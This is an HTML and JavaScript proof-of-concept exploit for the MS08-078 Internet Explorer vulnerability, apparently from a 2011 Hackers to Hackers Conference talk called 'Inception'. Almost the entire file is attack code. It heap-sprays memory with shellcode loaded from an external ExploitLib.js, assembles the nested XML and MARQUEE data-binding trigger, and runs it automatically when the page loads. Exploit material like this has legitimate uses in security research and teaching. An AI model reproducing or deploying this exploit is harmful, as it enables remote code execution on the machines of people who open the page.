<!--
   Talk:        Inception - The extended edition
   Author:      Nelson Brito <nbrito *NoSPAM* sekure.org>
   Conference:  Hackers to Hackers Conference Eighth Edition (October 2011)
 --------------------------------------------------------------------------
           .___                            __  .__
           |   | ____   ____  ____ _______/  |_|__| ____   ____
           |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \
           |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \
           |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/
                                   |__|
                       _______________  ____ ____
                       \_____  \   _  \/_   /_   |
                        /  ____/  /_\  \|   ||   |
                       /       \  \_/   \   ||   |
                       \________\_______/___||___|
 
 --------------------------------------------------------------------------
 Copyright (c) 2011 Nelson Brito. All rights reserved worldwide.
 
 This program is free software: you can redistribute it and/or modify it
 under  the terms of the GNU General Public License  as published by the
 Free Software Foundation,  either version 3 of the License, or (at your
 option) any later version.
 
 This program  is  distributed in  the hope that  it will be useful, but
 WITHOUT  ANY  WARRANTY;   without   even  the   implied   warranty   of
 MERCHANTABILITY  or  FITNESS  FOR  A  PARTICULAR  PURPOSE.  See the GNU
 General Public License for more details.
 
 You  should have  received a copy of the  GNU  General  Public  License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
-->
<HTML>
<SCRIPT SRC="./ExploitLib.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
<SCRIPT TYPE="text/javascript" LANGUAGE="JavaScript">
function Inception (){
	var ms08_078  = new Exploit(),
	    choice    = new Number(),
	    memory    = new Number(),
		address   = new Number(),
		shellcode = new String(),
		trigger   = new String();

	ms08_078.detail = [ "MS08-078", "0.01", "20111015", "Nelson Brito" ];
	ms08_078.offset = [ 0x0a0a0a0a ];
	ms08_078.message = false;

	choice    = ms08_078.random(ms08_078.offset.length);
	memory    = ms08_078.memory(ms08_078.offset[choice], 16);
	address   = ms08_078.address(ms08_078.offset[choice], 0);
	shellcode = ms08_078.shellcode(ms08_078.code[1], 1);

	if(!(ms08_078.spray(ms08_078.address(0x00000000, 0), ms08_078.address(0x00000000, 0), memory))){
		alert("Inception(): Heap memory defragmentation failed!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	trigger = trigger.concat("<XML ID=I><X><C>&lt;IMG SRC=&quot;javascript:");
	trigger = trigger.concat(ms08_078.address(ms08_078.offset[choice], 2));
	trigger = trigger.concat("ert(&apos;XSS&apos;)&quot;&gt;</C></X></XML>");
	trigger = trigger.concat("<MARQUEE DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>");
	trigger = trigger.concat("<MARQUEE DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>");
	trigger = trigger.concat("</MARQUEE></MARQUEE>");

	if(ms08_078.spray(address, shellcode, memory))
		document.getElementById("b00m").innerHTML = trigger;
}
</SCRIPT>
<BODY onLoad="Inception();">
<DIV ID="b00m" STYLE="display: none;">
</DIV>
</BODY>
</HTML>
